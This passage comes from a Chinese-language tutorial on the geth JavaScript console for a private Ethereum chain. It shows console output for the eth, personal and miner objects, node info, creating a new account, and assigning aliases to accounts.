debug:1.0 eth:1.0 miner:1.0 net:1.0 personal:1.0 rpc:1.0 shh:1.0 txpool:1.0 web3:1.0</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 1089px;"></div><div class="CodeMirror-gutters" style="display: none; height: 1089px;"></div></div></div></pre><h4><a name='header-n135' class='md-header-anchor '></a>查看系统变量</h4><ul><li>eth 全局变量</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; eth</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  accounts: [<span class="cm-string">"0x04f14c835b74f79b7def175c4e481929f9800501"</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  blockNumber: <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  coinbase: <span class="cm-string">"0x04f14c835b74f79b7def175c4e481929f9800501"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  compile: {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  lll: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  serpent: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  solidity: <span class="cm-keyword">function</span>()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  defaultAccount: undefined,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  defaultBlock: <span class="cm-string">"latest"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  gasPrice: <span class="cm-number">1</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  hashrate: <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  mining: <span class="cm-atom">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  pendingTransactions: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  protocolVersion: <span class="cm-string">"0x3f"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  syncing: <span class="cm-atom">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  call: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  contract: <span class="cm-keyword">function</span>(abi),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  estimateGas: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  filter: <span class="cm-keyword">function</span>(options, callback, filterCreationErrorCallback),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getAccounts: <span class="cm-keyword">function</span>(callback),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getBalance: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getBlock: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getBlockNumber: <span class="cm-keyword">function</span>(callback),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getBlockTransactionCount: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getBlockUncleCount: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getCode: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getCoinbase: <span class="cm-keyword">function</span>(callback),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getCompilers: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getGasPrice: <span class="cm-keyword">function</span>(callback),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getHashrate: <span class="cm-keyword">function</span>(callback),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getMining: <span class="cm-keyword">function</span>(callback),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getPendingTransactions: <span class="cm-keyword">function</span>(callback),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getProtocolVersion: <span class="cm-keyword">function</span>(callback),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getRawTransaction: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getRawTransactionFromBlock: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getStorageAt: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getSyncing: <span class="cm-keyword">function</span>(callback),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getTransaction: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getTransactionCount: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getTransactionFromBlock: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getTransactionReceipt: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getUncle: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getWork: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  iban: <span class="cm-keyword">function</span>(iban),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  icapNamereg: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  isSyncing: <span class="cm-keyword">function</span>(callback),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  namereg: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  resend: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  sendIBANTransaction: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  sendRawTransaction: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  sendTransaction: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  sign: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  signTransaction: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  submitTransaction: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  submitWork: <span class="cm-keyword">function</span>()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 1365px;"></div><div class="CodeMirror-gutters" style="display: none; height: 1365px;"></div></div></div></pre><ul><li>personal 变量</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; personal</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  listAccounts: [<span class="cm-string">"0x04f14c835b74f79b7def175c4e481929f9800501"</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  listWallets: [{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  accounts: [{...}],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  status: <span class="cm-string">"Unlocked"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  url: <span class="cm-string">"keystore:///root/go/src/github.com/ethereum/go-ethereum/build/bin/data/keystore/UTC--2018-07-24T13-02-23.501704460Z--04f14c835b74f79b7def175c4e481929f9800501"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  deriveAccount: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ecRecover: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getListAccounts: <span class="cm-keyword">function</span>(callback),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getListWallets: <span class="cm-keyword">function</span>(callback),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  importRawKey: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  lockAccount: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  newAccount: <span class="cm-keyword">function</span> github.com/ethereum/go-ethereum/console.(*bridge).NewAccount-fm(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  openWallet: <span class="cm-keyword">function</span> github.com/ethereum/go-ethereum/console.(*bridge).OpenWallet-fm(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  sendTransaction: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  sign: <span class="cm-keyword">function</span> github.com/ethereum/go-ethereum/console.(*bridge).Sign-fm(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  signTransaction: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  unlockAccount: <span class="cm-keyword">function</span> github.com/ethereum/go-ethereum/console.(*bridge).UnlockAccount-fm()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 514px;"></div><div class="CodeMirror-gutters" style="display: none; height: 514px;"></div></div></div></pre><ul><li>miner 变量</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; miner</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  getHashrate: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  setEtherbase: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  setExtra: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  setGasPrice: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-builtin">start</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-builtin">stop</span>: <span class="cm-keyword">function</span>()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 215px;"></div><div class="CodeMirror-gutters" style="display: none; height: 215px;"></div></div></div></pre><h4><a name='header-n151' class='md-header-anchor '></a>查看节点信息</h4><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded md-focus" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 130.672px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; admin.nodeInfo</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  enode: <span class="cm-string">"enode://682e6fc409065786bbb267b14eb29e06fa909b00a32150958bfda45ec589b5fa0c40296cc4e5cefd090d4e4dcfb19a36259154738a95d90ee9e2f0f7f4135fec@0.0.0.0:30303"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  id: <span class="cm-string">"682e6fc409065786bbb267b14eb29e06fa909b00a32150958bfda45ec589b5fa0c40296cc4e5cefd090d4e4dcfb19a36259154738a95d90ee9e2f0f7f4135fec"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ip: <span class="cm-string">"0.0.0.0"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  listenAddr: <span class="cm-string">"[::]:30303"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: <span class="cm-string">"Geth/v1.8.13-unstable/windows-amd64/go1.10.3"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ports: {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  discovery: <span class="cm-number">30303</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  listener: <span class="cm-number">30303</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  protocols: {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  eth: {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  config: {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  chainId: <span class="cm-number">10</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  eip150Hash: <span class="cm-string">"0x0000000000000000000000000000000000000000000000000000000000000000"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  eip155Block: <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  eip158Block: <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  homesteadBlock: <span class="cm-number">0</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  difficulty: <span class="cm-number">33554432</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  genesis: <span class="cm-string">"0xbf289100224ae9e27375b93509ff30b7624af5e8ae3eae472e814a2dd6ad1419"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  head: <span class="cm-string">"0xbf289100224ae9e27375b93509ff30b7624af5e8ae3eae472e814a2dd6ad1419"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  network: <span class="cm-number">1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }</span></pre><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 721px;"></div><div class="CodeMirror-gutters" style="display: none; height: 721px;"></div></div></div></pre><h4><a name='header-n1634' class='md-header-anchor '></a>账户操作</h4><ul><li>查看系统所有用户</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; eth.accounts</span></pre></div><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-string">"0x04f14c835b74f79b7def175c4e481929f9800501"</span>]</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 54px;"></div><div class="CodeMirror-gutters" style="display: none; height: 54px;"></div></div></div></pre><ul><li>创建新用户</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; personal.newAccount(<span class="cm-string">'123456'</span>)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">"0xa5f833dd93979f15d67392ce78ad78829e5a97e1"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; eth.accounts</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-string">"0x04f14c835b74f79b7def175c4e481929f9800501"</span>, <span class="cm-string">"0xe9db1b66197355d0f05534a53f6b7dcf0c873c76"</span>]</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 100px;"></div><div class="CodeMirror-gutters" style="display: none; height: 100px;"></div></div></div></pre><p>​<span>	</span>创建成功后，会展示创建成功的地址，其中上面的表达式中，中间传入的 123456 为密码 。再次查看系统所有用户，可以看到共有两个用户。</p><ul><li>给用户取别名</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; user1 <span class="cm-operator">=</span> eth.accounts[0]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">"0x04f14c835b74f79b7def175c4e481929f9800501"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; user2 <span class="cm-operator">=</span> eth.accounts[1]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">"0xe9db1b66197355d0f05534a53f6b7dcf0c873c76"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; user1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">"0x04f14c835b74f79b7def175c4e481929f9800501"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; user2</span></pre><pre class=" CodeMirror-line " role="presentation"><span 